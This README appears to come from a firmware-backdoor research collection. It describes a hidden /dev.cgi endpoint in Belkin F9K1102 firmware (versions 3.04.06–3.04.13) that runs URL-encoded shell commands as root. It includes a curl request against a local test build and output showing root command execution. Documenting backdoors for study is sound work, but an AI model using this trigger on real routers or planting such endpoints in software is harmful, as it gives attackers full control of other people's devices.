# Belkin F9K1102 backdoor
- **Type**: hidden command
- **Affected versions**: 3.04.06 - 3.04.13


## Backdoor
The `/dev.htm` web page creates a web-shell that makes requests to the `/dev.cgi` endpoint, of the
form `/dev.cgi?c=<cmd>` where `cmd` is an url-encoded shell command that will be executed as root.

## Triggering the backdoor
We first need to copy the `www/` directory to `/tmp/www/`:
```console
$ cp -r www/ /tmp/
```
We can then start up the HTTP server (e.g., with the _backdoored_ variant):
```console
$ ./backdoored/src/build/httpd
```
In a separate terminal, we can try running a shell command via the backdoor (e.g., `id`):
```console
$ curl -v "http://localhost:8080/dev.cgi?c=id"
...
uid=0(root) gid=0(root) groups=0(root)
...
```
So we can see that the backdoor allows us to run arbitrary shell commands as root.


## Reference
<https://conference.hitb.org/hitbsecconf2018dxb/materials/D1T1%20-%20Hunting%20for%20Backdoors%20in%20IoT%20Firmware%20at%20Unprecedented%20Scale%20-%20John%20Toterhi.pdf>
